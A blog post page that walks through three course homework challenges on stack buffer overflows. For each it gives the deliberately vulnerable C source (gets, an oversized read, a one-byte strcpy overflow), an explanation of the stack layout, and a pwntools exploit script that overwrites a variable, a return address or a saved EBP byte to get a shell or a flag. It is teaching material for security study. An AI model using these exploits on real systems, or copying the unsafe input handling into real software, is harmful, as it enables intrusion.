<!DOCTYPE html>
<html lang>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  
  <meta name="keywords" content="Antirain">
  <meta name="description" content="Antirain&#39;s blog">
  
  <title>Antirain</title>
  
    <!-- stylesheets list from config.yml -->
    
      <link rel="stylesheet" href="/css/materialize.min.css">
    
      <link rel="stylesheet" href="/css/main.min.css">
    
  
  <style type="text/css">
      html{
          font-family: sans-serif;
          font-weight: 300;
      }
      @font-face {
          font-family: 'Material Icons';
          font-style: normal;
          font-weight: 400;
          src: url(/fonts/MaterialIcons-Regular.eot);
          src: url(/fonts/MaterialIcons-Regular.woff2) format('woff2'),
          url(/fonts/MaterialIcons-Regular.woff) format('woff'),
          url(/fonts/MaterialIcons-Regular.ttf) format('truetype')
      }
  </style>
<link rel="shortcut icon" href="/images/favicon2.ico">

<!-- highlight.js代码高亮主题 css 引入-->
<link rel="stylesheet" href="/css/highlight/styles/monokai.css">
<!-- highlight.js代码高亮主题 css 引入-->

<!-- highlight.js代码高亮主题 script 引入-->
<script src="/js/highlight.pack.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
<!-- highlight.js代码高亮主题 script 引入-->
</head>
<body>
<div id="menu-box"><a href="javascript:void(0)" id="menu" data-activates="slide-out" class="button-collapse menu"><span class="nav-btn"></span></a></div>
<div id="menu-outer">
  <div id="menu-inner">
      <ul id="slide-out" class="side-nav">
    <div class="nav-header" style="background-image: url(/images/15.jpg);background-color:#DDDDDD">
    <div class="header-box"><img src="/images/header2.jpg" ondragstart="return false;"></div>
    <p color="black">Antirain</p> 
    <div class="nav-link">
        
        <a href="https://github.com/AshenAshes" target="_blank"><div class="link-box github"></div></a>
         
        
        <a href="mailto:aluxes@foxmail.com"><div class="link-box email"></div></a>
        
    </div>
    <div class="nav-search">
        <form id="search-form"> <!-- 搜索框相关 -->
            <input type="text" id="local-search-input" name="q" results="0" placeholder="搜索..." class="search form-control" autocomplete="off" autocorrect="off">
            <div class="nav-search-img"><i class="material-icons">search</i></div>
        </form>
        <div id="local-search-result"></div> <!-- 搜索结果区 -->
        <p class="no-result">无搜索结果</p>
    </div>
</div>
    <!--Homepage-->

<li class="nav-list">
    <a href="/" target="_self">
        <div class="nav-ico"><i class="material-icons">home</i> </div><p>主页</p>
    </a>
</li>

<!--archives-->

<li class="nav-list dropdown-btn">
    <a class target="_self">
        <div class="nav-ico"><i class="material-icons">assignment</i></div><p>归档</p><div class="dropdown-ico"><i class="material-icons">arrow_drop_down</i></div>
    </a>
</li>

<ul class="dropdown-menu dropdown">
    <li class="nav-dropdown-list">
        <a class="archive-link" href="/archives/2020/12/">December 2020<span class="archive-count">1</span></a></li><li class="nav-dropdown-list"><a class="archive-link" href="/archives/2020/07/">July 2020<span class="archive-count">3</span></a></li><li class="nav-dropdown-list"><a class="archive-link" href="/archives/2020/02/">February 2020<span class="archive-count">1</span></a></li><li class="nav-dropdown-list"><a class="archive-link" href="/archives/2020/01/">January 2020<span class="archive-count">3</span></a></li><li class="nav-dropdown-list"><a class="archive-link" href="/archives/1999/08/">August 1999<span class="archive-count">1</span></a>
    </li>
</ul>
<!--categories-->

<li class="nav-list dropdown-btn">
    <a class target="_self">
        <div class="nav-ico"><i class="material-icons">dashboard</i></div><p>分类</p><div class="dropdown-ico"><i class="material-icons">arrow_drop_down</i></div>
    </a>
</li>

<ul class="dropdown-menu dropdown">
    <li class="nav-dropdown-list">
        <a class="category-link" href="/categories/学习/">学习<span class="category-count">6</span></a></li><li class="nav-dropdown-list"><a class="category-link" href="/categories/随笔/">随笔<span class="category-count">2</span></a>
    </li>
</ul>
<!--tags-->

<li class="nav-list">
    <a href="/archives" target="_self">
        <div class="nav-ico"><i class="material-icons">bookmark</i> </div><p>标签</p>
    </a>
</li>

<!--photo-->

<!--friends-->

<li class="nav-list">
    <a href="/friends" target="_self">
        <div class="nav-ico"><i class="material-icons">face</i> </div><p>友链</p>
    </a>
</li>

<!--about-->


</ul>

  </div>
</div>

<div id="content-outer">
  <div id="content-inner">
    <article id="post">
  <div class="post-page-title" style="background-color:#DDDDDD;background-image:url(/images/security1.jpg)">
  <h2>Software Security Note(1) | Buffer Overflow | HW</h2>
    
  <p>作者:Antirain &nbsp;&nbsp; 发布于:<time datetime="2020-07-17T22:59:07.000Z">
          2020-07-18
    </time>
    <span id="busuanzi_container_page_pv" style="display:none">
      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
    </span>
  </p>
    
  </div>
  <div class="post-page-content">
  <p>是Buffer Overflow作业的讲解~</p>
<p>  </p>
<h3 id="buffer-overflow-baby"><a class="markdownIt-Anchor" href="#buffer-overflow-baby"></a> Buffer Overflow Baby</h3>
<hr>
<p>Overwrite变量值来拿到shell。</p>
<p>  </p>
<h4 id="source-code"><a class="markdownIt-Anchor" href="#source-code"></a> Source code</h4>
<pre class="highlight"><code class="C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LENGTH 256</span>

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hear</span><span class="hljs-params">()</span></span>{
    <span class="hljs-keyword">char</span> flag = <span class="hljs-string">'N'</span>;
    <span class="hljs-keyword">char</span> str[LENGTH];
    gets(str);
    <span class="hljs-keyword">if</span> (flag == <span class="hljs-string">'Y'</span>) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[HACKED]\n"</span>);
        execve(<span class="hljs-string">"/bin/sh"</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);
    }   
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span>{
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ZJUSSEC HW1: Buffer Overflow Baby\n"</span>);
    
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hi. Tell me something, less than %d charecters ...\n"</span>, LENGTH);
    hear();
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Roger\n"</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>  </p>
<h4 id="过程"><a class="markdownIt-Anchor" href="#过程"></a> 过程</h4>
<p>栈的布局如下所示：</p>
<img src="/article/software-security(1)/hw11.png" width="60%" height="60%">
<p>所以只要溢出一个字符’Y’来覆盖’N’即可。</p>
<p>  </p>
<h4 id="code"><a class="markdownIt-Anchor" href="#code"></a> Code</h4>
<pre class="highlight"><code class="python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

io = process(<span class="hljs-string">'./bof-baby'</span>)

payload = <span class="hljs-string">'A'</span>*<span class="hljs-number">256</span>+<span class="hljs-string">'Y'</span>
io.sendline(payload)

io.interactive()
</code></pre>
<p>然后可以得到shell。</p>
<img src="/article/software-security(1)/hw12.png" width="60%" height="60%">
<p>  </p>
<h3 id="buffer-overflow-boy"><a class="markdownIt-Anchor" href="#buffer-overflow-boy"></a> Buffer Overflow Boy</h3>
<hr>
<p>Overwrite return address.</p>
<p>原题要nc服务器，这里只写本地端。</p>
<p>  </p>
<h4 id="source-code-2"><a class="markdownIt-Anchor" href="#source-code-2"></a> Source code</h4>
<pre class="highlight"><code class>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdbool.h&gt;
#include &lt;stddef.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &quot;pwnable_harness.h&quot;

#define LENGTH 256

/* Filename of the first flag */
static const char* flagfile = &quot;flag1.txt&quot;;

/* Send the user the contents of the first flag file. */
static void giveFlag(void) {
    char flag[64];
    FILE* fp = fopen(flagfile, &quot;r&quot;);
    if(!fp) {
        perror(flagfile);
        return;
    }
    
    fgets(flag, sizeof(flag), fp);
    fclose(fp);
    
    printf(&quot;[√] Your flag: %s\n&quot;, flag);
}
unsigned long long int id = 18041;

void target_18041(void)             
{                                               
    if (id != 18041) {                              
        printf(&quot;[!] Hey, who are you!\n&quot;);      
    }                                           
    else {                                      
        giveFlag();                             
        printf(&quot;[*] pwned \n&quot;);                 
    }                                           
    exit(0);                                    
}

void hear() {
    char buf[LENGTH];
    read(STDIN_FILENO, buf, LENGTH*2);
    if (strlen(buf) &gt; 10) {
        printf(&quot;[x] Invalid Password \n&quot;);
        exit(0);
    }
}

static void handle_connection(int sock) {
    printf(&quot;[*] ZJUSSEC HW1: Buffer Overflow Boy \n&quot;);
    printf(&quot;[*] Hi, %lld. Give me something to overflow me! \n&quot;, id);
    hear();
}

int main(int argc, char** argv) {
    server_options opts = { };
    return server_main(argc, argv, opts, &amp;handle_connection);
}
</code></pre>
<p>  </p>
<h4 id="过程-2"><a class="markdownIt-Anchor" href="#过程-2"></a> 过程</h4>
<p>hear()里的read有LENGTH*2-LENGTH长度的溢出空间，其栈内存布局为：</p>
<img src="/article/software-security(1)/hw21.png" width="60%" height="60%">
<p>为了拿到shell，我们的目标是去执行target_18041()，所以用target_18041()的地址去覆盖hear()的ret即可。</p>
<p>通过gdb去拿到target_18041()的地址：</p>
<img src="/article/software-security(1)/hw22.png" width="60%" height="60%">
<p>可以看到地址是0x080486a6。</p>
<p>buffer的长度256+ebp的4字节+new ret构造payload，因为对buf有长度检查，所以前面要插入一个’\0’。这样去构造即可。</p>
<p>  </p>
<h4 id="code-2"><a class="markdownIt-Anchor" href="#code-2"></a> Code</h4>
<pre class="highlight"><code class="python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

io = process(<span class="hljs-string">'./bof-boy'</span>)

payload = <span class="hljs-string">'A'</span> + <span class="hljs-string">'\0'</span> + <span class="hljs-number">258</span>*<span class="hljs-string">'A'</span> + p32(<span class="hljs-number">0x080486a6</span>)
io.sendline(payload)

io.interactive()
</code></pre>
<p>需要在python2下运行，python3会有“TypeError: must be str, not bytes”的错误。</p>
<p>结果长这样：</p>
<img src="/article/software-security(1)/hw23.png" width="60%" height="60%">
<p>  </p>
<h3 id="buffer-overflow-again"><a class="markdownIt-Anchor" href="#buffer-overflow-again"></a> Buffer Overflow Again</h3>
<hr>
<p>构建Stack frame。</p>
<p>原题要nc服务器，这里只写本地端。</p>
<p>  </p>
<h4 id="source-code-3"><a class="markdownIt-Anchor" href="#source-code-3"></a> Source code</h4>
<pre class="highlight"><code class="C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"pwnable_harness.h"</span></span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LENGTH 256</span>

<span class="hljs-comment">/* Filename of the first flag */</span>
<span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* flagfile = <span class="hljs-string">"flag1.txt"</span>;

<span class="hljs-comment">/* Send the user the contents of the first flag file. */</span>
<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">giveFlag</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{
    <span class="hljs-keyword">char</span> flag[<span class="hljs-number">64</span>];
    FILE* fp = fopen(flagfile, <span class="hljs-string">"r"</span>);
    <span class="hljs-keyword">if</span>(!fp) {
        perror(flagfile);
        <span class="hljs-keyword">return</span>;
    }
    
    fgets(flag, <span class="hljs-keyword">sizeof</span>(flag), fp);
    fclose(fp);
    
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[√] Your flag: %s\n"</span>, flag);
}
<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> id = <span class="hljs-number">18041</span>;

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">target_18041</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>             
</span>{                                               
    <span class="hljs-keyword">if</span> (id != <span class="hljs-number">18041</span>) {                              
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[!] Hey, who are you!\n"</span>);      
    }                                           
    <span class="hljs-keyword">else</span> {                                      
        giveFlag();                             
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*] pwned \n"</span>);                 
    }                                           
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);                                    
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hear</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* arg)</span></span>{
    <span class="hljs-keyword">char</span> str[LENGTH];
    <span class="hljs-built_in">strcpy</span>(str, arg);
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handle_connection</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sock)</span> </span>{
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*] ZJUSSEC HW1: Buffer Overflow Again\n"</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*] Hi, %lld. Give me something to overflow me!\n"</span>, id);
    <span class="hljs-keyword">char</span> secret[LENGTH];
    read(STDIN_FILENO, secret, LENGTH+<span class="hljs-number">1</span>);
    hear(secret);
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>{
    server_options opts = { };
    <span class="hljs-keyword">return</span> server_main(argc, argv, opts, &amp;handle_connection);
}
</code></pre>
<p>  </p>
<h4 id="过程-3"><a class="markdownIt-Anchor" href="#过程-3"></a> 过程</h4>
<p>栈内存布局为：</p>
<img src="/article/software-security(1)/hw31.png" width="60%" height="60%">
<p>这题只有一个字节的溢出空间，可以修改handle和hear两者frame内的ebp地址的最低位字节。</p>
<p>思路是这样的：handle()中读入257个字符，进入hear()后，str所在的buffer读入了这257个字符，hear()的frame部分的ebp的最低位被修改。为了保证hear()中的strcpy()能够顺利执行，我们输入的第257位字符一定要是终结符。这样程序才不会发生错误。</p>
<p>当hear()执行完返回时(即执行leave指令的第二步pop $ebp)，这个错误的ebp会被pop给$ebp。回到handle()的frame，handle()执行完毕返回时(即执行leave指令的第一步mov $ebp, $esp)，栈顶指针会指向这个错误的ebp位置，然后执行ret指令时也会pop错误的ret add。我们的目标就是让程序能够在这一步跳到target()函数。</p>
<p>由于第257位字符是终结符0，被修改后的ebp一定小于原先的ebp。也就是说执行完handle()的leave的第一步后，esp的位置应该在buffer1处(因为buffer有256个字节长，基本可以确定范围)。可以在payload中加入target()的地址*n，只要被修改的ebp指向其中的任意一个target()地址开头，那么一定会pop地址给PC，进而执行target()。</p>
<p>所以我们保证修改后的ebp指向target()地址开头即可，先假设payload=addr32(target)*64，要计算一个偏移量来构造payload。</p>
<p>gdb看一下handle()域的ebp和esp的值：</p>
<img src="/article/software-security(1)/hw32.png" width="80%" height="80%">
<p>$ebp = 0xffffcb4c，$esp = 0xffffca4c，那么修改后的$ebp=0xffffcb00。0xcb00-0xca4c=180为4的倍数。所以修改后的ebp能刚好指向target()的开头，所以偏移量=0。</p>
<p>进而可以构造payload。</p>
<p>这道题在服务器端开启了ASLR，但偏移量总有可能是0，所以也不需要修改，多attack几次就能拿到flag。</p>
<p>在本地的结果：</p>
<img src="/article/software-security(1)/hw33.png" width="80%" height="80%">
<p>  </p>
<h4 id="code-3"><a class="markdownIt-Anchor" href="#code-3"></a> Code</h4>
<pre class="highlight"><code class="python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

io = process(<span class="hljs-string">'./bof-again'</span>)

payload = p32(<span class="hljs-number">0x080486a6</span>)*<span class="hljs-number">64</span>+<span class="hljs-string">'\0'</span>
io.sendline(payload)

io.interactive()
</code></pre>

  </div>
  <!--评论块-->
    

</article>
<nav class="post-nav">
  <!-- Prev Nav -->
    
  <a href="/2020/07/22/Software Security(2)/" id="post_nav-newer" class="post-nav-content prev-content">
      Prev: 《Software Security Note(2) | ROP》
  </a>
    


  <!-- Next Nav -->
    
  <a href="/2020/07/18/Software Security(1)/" id="post_nav-older" class="post-nav-content next-content">
      Next: 《Software Security Note(1) | Buffer Overflow》
  </a>
    
</nav>
<div class="post-toc-btn"><i class="material-icons">format_list_numbered</i></div>
<div class="post-toc-none"><p>(无)</p></div>
<div class="post-toc-box">
    <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#buffer-overflow-baby"><span class="post-toc-number">1.</span> <span class="post-toc-text"> Buffer Overflow Baby</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#source-code"><span class="post-toc-number">1.1.</span> <span class="post-toc-text"> Source code</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#过程"><span class="post-toc-number">1.2.</span> <span class="post-toc-text"> 过程</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#code"><span class="post-toc-number">1.3.</span> <span class="post-toc-text"> Code</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#buffer-overflow-boy"><span class="post-toc-number">2.</span> <span class="post-toc-text"> Buffer Overflow Boy</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#source-code-2"><span class="post-toc-number">2.1.</span> <span class="post-toc-text"> Source code</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#过程-2"><span class="post-toc-number">2.2.</span> <span class="post-toc-text"> 过程</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#code-2"><span class="post-toc-number">2.3.</span> <span class="post-toc-text"> Code</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#buffer-overflow-again"><span class="post-toc-number">3.</span> <span class="post-toc-text"> Buffer Overflow Again</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#source-code-3"><span class="post-toc-number">3.1.</span> <span class="post-toc-text"> Source code</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#过程-3"><span class="post-toc-number">3.2.</span> <span class="post-toc-text"> 过程</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#code-3"><span class="post-toc-number">3.3.</span> <span class="post-toc-text"> Code</span></a></li></ol></li></ol>
</div>
<!--<div class="post-back"><i class="material-icons">arrow_back</i></div>-->
<script type="text/javascript">
    menu();
</script>
  </div>
</div>
<div id="bottom-outer">
  <div id="bottom-inner">
    <a id="top-button" onfocus="this.blur();"><div class="up upinbody" style="background-color:#DDDDDD"><i class="material-icons material-up">vertical_align_top</i></div></a>


<p style="line-height: 45px">Copyright ©  2017-2020  Antirain</p>
<p style="line-height: 45px">Powered by <a href="https://hexo.io/" target="_blank"> Hexo </a> && Theme - <a href="https://github.com/moumao/hexo-theme-Vateral" target="_blank">Vateral</a></p>



<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


  </div>
</div>

<!--影集界面需要的资源-->



<!-- scripts list from theme config.yml -->

<script src="/js/jquery-3.1.1.min.js"></script>

<script src="/js/materialize.min.js"></script>

<script src="/js/main.min.js"></script>


<script>
    NProgress.start();
    NProgress.done();
    lazy();
    links();
    window.onpopstate = menu();
    //pjax操作
    $(document).pjax('a:not(.nopjax)', '#content-inner', {fragment:'#content-inner', timeout:8000});
    $(document).on('pjax:start', NProgress.start).on('pjax:end', NProgress.done)
        .on('pjax:end', () => {
            dowmdiv();
            lazy();
            toc();
            links();
            menu();
        });
</script>
</body>
</html>
